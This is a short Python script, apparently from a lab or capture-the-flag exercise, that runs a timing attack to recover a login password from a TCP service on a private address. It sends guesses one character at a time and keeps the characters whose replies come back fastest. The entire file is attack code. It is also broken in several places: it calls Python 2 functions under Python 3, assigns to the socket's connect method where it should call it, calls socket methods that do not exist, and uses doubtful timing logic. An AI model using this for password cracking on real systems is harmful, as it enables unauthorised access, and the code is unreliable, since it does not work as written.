#! /Library/Frameworks/Python.framework/Versions/3.5/bin/python3

import struct
import time
import socket
# from TCPClient import * 

server = "192.168.56.101"
port = "54311"


def checkLoginResponse(response):
	if("Invalid password!" in response):
		return False
	return True
	

def charRange(c1, c2):
	lst = []
	for c in xrange(ord(c1), ord(c2)+1):
		lst.append(chr(c))
	return lst


def CrackPassword():
# 	con = TCPClient(server, port)
	con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	con.connect = (server, port)
	posChars = charRange('a', 'z')
	posChars += charRange('A', 'Z')
	posChars += charRange('0', '9')
	password = ''
	done = False
	hdr = con.recv(1024)
	hdr = con.recv(23)
	
	while not done:
		for char in posChars:
			con.sendline(password + char)
			startTime = time.time()
			response = con.recvline()
			endTime = time.time()
			dif = endTime - startTime
			if(dif < 0.0005):
				print('{} {} {}.10'.format(password, char, dif))
				password += char
			done = checkLoginResponse(response)
			if(done):
				break
	return password


if __name__ == "__main__":
	print("[*] Running timing attack...")
	pw = CrackPassword()
	print("[*] Password {} found!".format(pw))